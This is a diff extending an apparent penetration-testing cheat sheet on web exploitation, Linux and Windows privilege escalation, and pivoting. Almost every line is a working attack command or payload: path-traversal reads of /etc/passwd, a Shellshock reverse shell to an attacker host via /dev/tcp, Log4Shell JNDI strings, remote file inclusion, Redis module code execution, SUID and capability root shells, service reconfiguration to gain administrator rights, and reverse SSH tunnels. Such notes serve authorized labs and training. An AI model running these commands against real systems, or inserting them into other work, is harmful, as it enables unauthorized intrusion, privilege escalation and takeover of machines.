@@ -113,6 +113,7 @@ wpscan --url http://$IP -U <user> -P /usr/share/wordlists/rockyou.txt   # login 
 #   username[$ne]=x&password[$ne]=x        |  username[$regex]=^admin
 # Spring Boot Actuator (Java):  /actuator/env  /actuator/heapdump  /actuator/sessions
 # LFI->RCE wrappers: php://filter/convert.base64-encode/resource=  data://  phar://
+curl --path-as-is "http://$IP/../../../../etc/passwd"   # curl strips ../ without this; matters on loopback services
 # Shellshock (/cgi-bin/*.sh):  User-Agent: () { :;}; echo; /bin/bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'
 # Log4Shell (any logged field):  ${jndi:ldap://<lhost>/x}     (marshalsec/JNDIExploit for the payload class)
 # GraphQL introspection:  POST /graphql {"query":"{__schema{types{name fields{name}}}}"}   (InQL, graphw00f)
@@ -120,6 +121,7 @@ wpscan --url http://$IP -U <user> -P /usr/share/wordlists/rockyou.txt   # login 
 # WebDAV:  davtest -url http://<ip>   ;  curl -T shell.php http://<ip>/   (upload .txt then MOVE if filtered)
 # Jenkins /script (Groovy):  println 'id'.execute().text
 # Redis unauth -> SSH key:  config set dir /var/lib/redis/.ssh ; config set dbfilename authorized_keys ; set x '<pubkey>' ; save
+# Redis as root, nothing to key? module RCE:  module load /tmp/module.so ; system.exec 'id'   (RedisModules-ExecuteCommand)
 # Ghostcat (AJP 8009, CVE-2020-1938):  python3 ajpShooter.py http://$IP:8080 8009 /WEB-INF/web.xml read
 # RFI - include takes a URL:  ?page=http://$LHOST/shell.txt
 #   Windows + allow_url_include=Off? UNC still works:  ?page=\\$LHOST\share\shell.php
@@ -302,11 +304,17 @@ copy \\$LHOST\share\file.exe                 # target
 ./linpeas.sh | tee linpeas.txt
 sudo -l
 find / -perm -4000 -type f 2>/dev/null       # SUID
-getcap -r / 2>/dev/null                       # capabilities
+getcap -r / 2>/dev/null                       # capabilities (NOT shown by find -perm -4000)
+# SUID entry on GTFOBins? sh/bash drop the euid unless you pass -p:
+/opt/suidfind . -exec /bin/sh -p \; -quit     # and SUID interpreters:
+php -r "pcntl_exec('/bin/sh', ['-p']);"       # gdb -nx -ex 'python import os; os.execl("/bin/sh","sh","-p")' -ex quit
+# cap_setuid=ep on an interpreter -> set uid 0 yourself:
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 crontab -l; cat /etc/crontab
 # check GTFOBins for anything you find in sudo -l or SUID
 ./pspy64 -pf -i 1000                          # watch cron/procs as root fires them (no root needed)
 sudo -u#-1 /bin/bash                           # CVE-2019-14287, when sudo -l shows (ALL, !root)
+sudo --version                                 # < 1.9.5p2 -> Baron Samedit CVE-2021-3156, any local user, no sudo rule
 # root runs a writable thing: cron/systemd-timer script | /etc/update-motd.d/* (fires on SSH login)
 # root 'tar ... *' in a writable dir -> touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'
 # root job runs git in a repo you can write -> .git/hooks/pre-commit (or post-commit), chmod +x, runs as root
@@ -326,10 +334,15 @@ id                                             # disk -> debugfs /dev/sda1 (read
 .\winpeas.exe
 whoami /priv                                  # look for SeImpersonate -> potato
 systeminfo                                    # then windows-exploit-suggester
+# PoC is C source and the target has no compiler? cross-compile on Kali:
+x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -static   # i686-w64-mingw32-gcc for 32-bit
 accesschk.exe -uwcqv <user> *                 # services you may reconfigure
 sc config <svc> binpath= "cmd /c net localgroup administrators <user> /add" && sc start <svc>
 #   Server Operators group members can do the above to any service = SYSTEM, no file dropped
 # open Squid proxy (3128/8080)? that is a free tunnel - proxychains conf:  http <ip> 3128
+# Windows foothold, no sshd? dial out instead - it ships an OpenSSH *client*:
+ssh -R 1080 -N <user>@$LHOST                   # older boxes: plink.exe -ssh -l <u> -pw <p> -R 1080 $LHOST
+netsh interface portproxy add v4tov4 listenport=9999 connectaddress=<internal> connectport=3389   # admin, no upload
 ```
 
 ## Container escape
